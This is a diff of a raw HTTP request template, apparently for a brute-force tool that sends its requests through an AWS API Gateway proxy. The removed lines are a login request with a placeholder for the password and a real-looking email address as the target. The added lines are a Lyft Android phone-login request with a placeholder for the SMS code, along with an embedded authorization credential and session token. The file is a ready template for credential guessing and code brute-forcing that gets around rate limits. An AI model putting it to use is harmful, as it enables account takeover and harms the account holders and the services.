@@ -1,12 +1,19 @@
-POST /burpendpoint/sdkHelper/nxsATS/SDK/TokenGen HTTP/1.1
-Host: oeiowrijdi.execute-api.us-west-2.amazonaws.com
+POST /burpendpoint/oauth2/access_token HTTP/1.1
+Authorization: Basic ZVNhdDctaXU5ZG9NOlp0dkxEejBuMS1rSlZ3a0l2eEM0aVNKMHlNdkp5ZFBx
+X-Locale-Language: en
+X-Client-Session-ID: 2012ffd8-ac23-4e4c-afc9-483f7c33aa63
+X-Device-Density: 480
+X-Carrier: Republic
+X-Locale-Region: US
+User-Device: motorola Moto G (4)
+User-Agent: lyft:android:7.0:6.14.3.1578489314
+X-Design-ID: X
+Accept-Language: en_US
+X-Session: eyJmIjoiNWIwNjkyNjItYzYwNy00YjkwLTg0ZmUtNDVlOTk0OGZjMjI3IiwiYSI6IjI1MzIxNjMyZWQzYjA0NmMiLCJrIjoiYThlYWY0MTgtNDk0NC00OWMxLWFiODEtZDRmZjk4NWFlNGM2IiwiaCI6dHJ1ZX0=
 Content-Type: application/x-www-form-urlencoded
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
+Content-Length: 256
+Host: YOUR_AWS_GATEWAY
 Connection: close
-Upgrade-Insecure-Requests: 1
-Content-Length: 424
+Accept-Encoding: gzip, deflate
 
-password=%s&mkLanguage=EN&client_version=be536466-6633-4dd9-a491-cbf1d852bf17%2F24&rememberMe=off&deviceType=PHONE&TG_OP=TokenGen%2CWebTokenGen&userid=tunilouis%40sbcglobal.net&deviceMake=motorola&deviceIdentifier=&client_type=android%2F1.0.94&deviceOSVersion=24&appID=O5FoY1UsNnqOAb4ShkIIlZbfqkU%3D&respType=json&mkSDKVersion=1.0.94&deviceModel=Moto+G+%284%29&rememberID=off&mkVersion=&pushToken=&deviceOS=android
+grant_type=urn%3Alyft%3Aoauth2%3Agrant_type%3Aphone&phone_number=%2B1YOUR_PHONE_NUMBER&phone_code=%s&identifiers=W3sidHlwZSI6ImFuZHJvaWRfYmFja3VwX3Rva2VuIiwic291cmNlIjoibHlmdF9hbmRyb2lkX2FwcCIsIm5hbWUiOiJhOGVhZjQxOC00OTQ0LTQ5YzEtYWI4MS1kNGZmOTg1YWU0YzYifV0%3D
